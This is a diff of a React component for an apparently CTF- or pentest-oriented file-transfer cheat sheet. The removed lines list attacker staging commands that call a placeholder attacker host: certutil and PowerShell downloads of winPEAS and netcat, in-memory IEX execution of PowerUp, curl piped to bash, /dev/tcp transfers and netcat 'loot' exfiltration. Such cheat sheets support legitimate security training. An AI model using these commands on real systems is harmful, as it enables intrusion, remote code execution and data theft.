@@ -1,21 +1,21 @@
-import React, { useState } from 'react';
-import { Copy, Check, Terminal, Server, Laptop } from 'lucide-react';
+import React, { useState, useMemo } from 'react';
+import { Copy, Check, Terminal, Server, Laptop, Wrench } from 'lucide-react';
 import { useCtfStore } from '../../store/useCtfStore';
 import { safeCopyToClipboard, playCyberSound } from '../../utils/helpers';
 import { toast } from '../../store/useToastStore';
+import {
+  COMMON_TRANSFER_TOOLS,
+  generateFileTransferMethods,
+  FileTransferMethod,
+} from '../../utils/offensiveTransferUtils';
 
-export interface FileTransferItem {
-  id: string;
-  os: 'windows' | 'linux' | 'universal' | 'server';
-  category: 'download' | 'upload' | 'server' | 'in-memory';
-  title: string;
-  description: string;
-  commandTemplate: string;
-}
+export type { FileTransferMethod as FileTransferItem };
 
 export const FileTransferCheatsheet: React.FC = () => {
   const { globalVars, soundEnabled } = useCtfStore();
   const [filterOs, setFilterOs] = useState<'all' | 'windows' | 'linux' | 'server'>('all');
+  const [selectedTool, setSelectedTool] = useState<string>('linpeas.sh');
+  const [customFile, setCustomFile] = useState<string>('');
   const [copiedId, setCopiedId] = useState<string | null>(null);
 
   const lhost = globalVars.lhost || '10.10.14.X';
@@ -24,141 +24,18 @@ export const FileTransferCheatsheet: React.FC = () => {
   const user = globalVars.user || 'kali';
   const cred = globalVars.cred || 'kali';
 
-  const transfers: FileTransferItem[] = [
-    // Servers (Attacker Listeners)
-    {
-      id: 'srv-http-py3',
-      os: 'server',
-      category: 'server',
-      title: 'Python 3 HTTP Staging Server',
-      description: 'Host local directory over HTTP port 8000 (or custom LPORT).',
-      commandTemplate: `python3 -m http.server ${lport}`,
-    },
-    {
-      id: 'srv-smb-impacket',
-      os: 'server',
-      category: 'server',
-      title: 'Impacket SMB Server (SMB2)',
-      description: 'Host directory as SMB share "tools" with SMB2 support for modern Windows boxes.',
-      commandTemplate: `impacket-smbserver tools $(pwd) -smb2support -user ${user} -password ${cred}`,
-    },
-    {
-      id: 'srv-ftp-py',
-      os: 'server',
-      category: 'server',
-      title: 'Python FTPServer (Writeable)',
-      description: 'Quick writeable FTP staging server using pyftpdlib.',
-      commandTemplate: `python3 -m pyftpdlib -p 21 -w -u ${user} -P ${cred}`,
-    },
-    {
-      id: 'srv-upload-php',
-      os: 'server',
-      category: 'server',
-      title: 'Quick Python Upload Server',
-      description: 'Listen on port 8000 accepting POST file uploads via uploadserver package.',
-      commandTemplate: `python3 -m uploadserver ${lport}`,
-    },
+  const activeFilename = customFile.trim() || selectedTool;
 
-    // Windows Targets
-    {
-      id: 'win-certutil',
-      os: 'windows',
-      category: 'download',
-      title: 'Certutil Cache Split (Windows)',
-      description: 'Download executable via built-in certutil (bypasses basic restrictions; leaves cache).',
-      commandTemplate: `certutil -urlcache -split -f "http://${lhost}:${lport}/winPEAS.exe" winPEAS.exe`,
-    },
-    {
-      id: 'win-ps-iwr',
-      os: 'windows',
-      category: 'download',
-      title: 'PowerShell Invoke-WebRequest / iwr',
-      description: 'Native PS3+ download command saving directly to disk.',
-      commandTemplate: `powershell -c "Invoke-WebRequest -Uri 'http://${lhost}:${lport}/nc.exe' -OutFile 'nc.exe'"`,
-    },
-    {
-      id: 'win-ps-webclient',
-      os: 'windows',
-      category: 'download',
-      title: 'PowerShell WebClient DownloadFile',
-      description: 'Low-footprint .NET WebClient download (compatible with older PS versions).',
-      commandTemplate: `powershell -c "(New-Object Net.WebClient).DownloadFile('http://${lhost}:${lport}/nc.exe', 'nc.exe')"`,
-    },
-    {
-      id: 'win-ps-iex',
-      os: 'windows',
-      category: 'in-memory',
-      title: 'PowerShell In-Memory Execution (IEX)',
-      description: 'Execute script directly in RAM without touching disk.',
-      commandTemplate: `powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://${lhost}:${lport}/PowerUp.ps1')"`,
-    },
-    {
-      id: 'win-smb-copy',
-      os: 'windows',
-      category: 'download',
-      title: 'Windows SMB Share Direct Copy',
-      description: 'Copy directly from attacker SMB share mounted or referenced via UNC path.',
-      commandTemplate: `net use \\\\${lhost}\\tools /u:${user} ${cred} && copy \\\\${lhost}\\tools\\winPEAS.exe C:\\temp\\`,
-    },
-    {
-      id: 'win-bitsadmin',
-      os: 'windows',
-      category: 'download',
-      title: 'Bitsadmin Background Transfer',
-      description: 'Native Windows BITS job transfer.',
-      commandTemplate: `bitsadmin /transfer job /download /priority normal http://${lhost}:${lport}/file.exe C:\\temp\\file.exe`,
-    },
-
-    // Linux Targets
-    {
-      id: 'lin-curl-out',
-      os: 'linux',
-      category: 'download',
-      title: 'Linux Curl File Download',
-      description: 'Standard curl command to save output to disk.',
-      commandTemplate: `curl -s -L "http://${lhost}:${lport}/linpeas.sh" -o linpeas.sh && chmod +x linpeas.sh`,
-    },
-    {
-      id: 'lin-curl-pipe',
-      os: 'linux',
-      category: 'in-memory',
-      title: 'Linux Curl Pipe to Bash',
-      description: 'Execute remote shell script directly in memory without writing to disk.',
-      commandTemplate: `curl -s "http://${lhost}:${lport}/linpeas.sh" | bash`,
-    },
-    {
-      id: 'lin-wget',
-      os: 'linux',
-      category: 'download',
-      title: 'Linux Wget Download',
-      description: 'Fetch payload using wget with explicit output path.',
-      commandTemplate: `wget "http://${lhost}:${lport}/exploit" -O /tmp/exploit && chmod +x /tmp/exploit`,
-    },
-    {
-      id: 'lin-dev-tcp',
-      os: 'linux',
-      category: 'download',
-      title: 'Linux /dev/tcp Raw Transfer (Living off the Land)',
-      description: 'Download file when curl/wget are unavailable using bash built-in /dev/tcp.',
-      commandTemplate: `exec 3<>/dev/tcp/${lhost}/${lport}; echo -e "GET /file HTTP/1.0\\r\\n\\r\\n" >&3; cat <&3 > /tmp/file`,
-    },
-    {
-      id: 'lin-nc-rx',
-      os: 'linux',
-      category: 'download',
-      title: 'Netcat File Transfer (Target Listening)',
-      description: 'Target receives file over raw TCP socket from attacker.',
-      commandTemplate: `nc -lvnp 9001 > /tmp/loot.tar.gz  # Attacker sends: nc -vn ${targetIp} 9001 < loot.tar.gz`,
-    },
-    {
-      id: 'lin-base64',
-      os: 'linux',
-      category: 'download',
-      title: 'Terminal Base64 Copy-Paste Transfer',
-      description: 'Transfer small binaries directly through clipboard over restricted shell.',
-      commandTemplate: `cat file | base64 -w 0  # Paste on target: echo "<BASE64>" | base64 -d > file`,
-    },
-  ];
+  const transfers = useMemo(() => {
+    return generateFileTransferMethods({
+      lhost,
+      lport,
+      filename: activeFilename,
+      targetIp,
+      user,
+      cred,
+    });
+  }, [lhost, lport, activeFilename, targetIp, user, cred]);
 
   const handleCopy = async (cmd: string, id: string) => {
     const ok = await safeCopyToClipboard(cmd);
@@ -177,14 +54,61 @@ export const FileTransferCheatsheet: React.FC = () => {
 
   return (
     <div className="space-y-4">
+      {/* File & Tool Quick Presets */}
+      <div className="p-3.5 rounded-xl border border-subtle bg-surface-card space-y-2.5">
+        <div className="flex flex-wrap items-center justify-between gap-2">
+          <div className="flex items-center gap-2">
+            <Wrench className="w-4 h-4 text-accent" />
+            <span className="text-xs font-semibold text-primary">Staging Payload / Tool Presets</span>
+          </div>
+          <div className="text-xs text-muted font-mono">
+            Active: <span className="text-accent font-semibold">{activeFilename}</span>
+          </div>
+        </div>
+
+        <div className="flex flex-wrap items-center gap-1.5">
+          {COMMON_TRANSFER_TOOLS.map((tool) => {
+            const isSelected = selectedTool === tool && !customFile.trim();
+            return (
+              <button
+                key={tool}
+                type="button"
+                onClick={() => {
+                  setSelectedTool(tool);
+                  setCustomFile('');
+                  if (soundEnabled) playCyberSound('click');
+                }}
+                className={`px-2.5 py-1 rounded-lg text-xs font-mono transition-colors cursor-pointer active:scale-[0.97] border ${
+                  isSelected
+                    ? 'bg-accent text-on-accent border-accent font-semibold shadow-xs'
+                    : 'bg-surface-sunken hover:bg-surface-hover border-subtle text-secondary'
+                }`}
+              >
+                {tool}
+              </button>
+            );
+          })}
+
+          <input
+            type="text"
+            value={customFile}
+            onChange={(e) => setCustomFile(e.target.value)}
+            placeholder="Or custom filename..."
+            className="h-7 px-2.5 rounded-lg border border-subtle bg-surface-sunken text-xs font-mono text-primary placeholder:text-muted focus:border-accent focus:outline-none w-44"
+          />
+        </div>
+      </div>
+
       {/* OS Filter Chips */}
       <div className="flex flex-wrap items-center justify-between gap-3">
-        <div className="flex items-center gap-1.5">
+        <div className="flex items-center gap-1.5 flex-wrap">
           <button
             type="button"
             onClick={() => setFilterOs('all')}
             className={`px-3 py-1.5 rounded-lg text-xs font-medium cursor-pointer transition-colors ${
-              filterOs === 'all' ? 'bg-accent text-on-accent' : 'bg-surface-card border border-subtle text-secondary hover:text-primary'
+              filterOs === 'all'
+                ? 'bg-accent text-on-accent'
+                : 'bg-surface-card border border-subtle text-secondary hover:text-primary'
             }`}
           >
             All Methods ({transfers.length})
@@ -193,7 +117,9 @@ export const FileTransferCheatsheet: React.FC = () => {
             type="button"
             onClick={() => setFilterOs('server')}
             className={`px-3 py-1.5 rounded-lg text-xs font-medium cursor-pointer transition-colors ${
-              filterOs === 'server' ? 'bg-accent text-on-accent' : 'bg-surface-card border border-subtle text-secondary hover:text-primary'
+              filterOs === 'server'
+                ? 'bg-accent text-on-accent'
+                : 'bg-surface-card border border-subtle text-secondary hover:text-primary'
             }`}
           >
             Attacker Servers (Listeners)
@@ -202,7 +128,9 @@ export const FileTransferCheatsheet: React.FC = () => {
             type="button"
             onClick={() => setFilterOs('windows')}
             className={`px-3 py-1.5 rounded-lg text-xs font-medium cursor-pointer transition-colors ${
-              filterOs === 'windows' ? 'bg-accent text-on-accent' : 'bg-surface-card border border-subtle text-secondary hover:text-primary'
+              filterOs === 'windows'
+                ? 'bg-accent text-on-accent'
+                : 'bg-surface-card border border-subtle text-secondary hover:text-primary'
             }`}
           >
             Windows Target Downloads
@@ -211,7 +139,9 @@ export const FileTransferCheatsheet: React.FC = () => {
             type="button"
             onClick={() => setFilterOs('linux')}
             className={`px-3 py-1.5 rounded-lg text-xs font-medium cursor-pointer transition-colors ${
-              filterOs === 'linux' ? 'bg-accent text-on-accent' : 'bg-surface-card border border-subtle text-secondary hover:text-primary'
+              filterOs === 'linux'
+                ? 'bg-accent text-on-accent'
+                : 'bg-surface-card border border-subtle text-secondary hover:text-primary'
             }`}
           >
             Linux Target Downloads
@@ -219,7 +149,8 @@ export const FileTransferCheatsheet: React.FC = () => {
         </div>
 
         <div className="text-xs text-muted font-mono">
-          LHOST: <span className="text-accent">{lhost}</span> | LPORT: <span className="text-accent">{lport}</span>
+          LHOST: <span className="text-accent">{lhost}</span> | LPORT:{' '}
+          <span className="text-accent">{lport}</span>
         </div>
       </div>
 
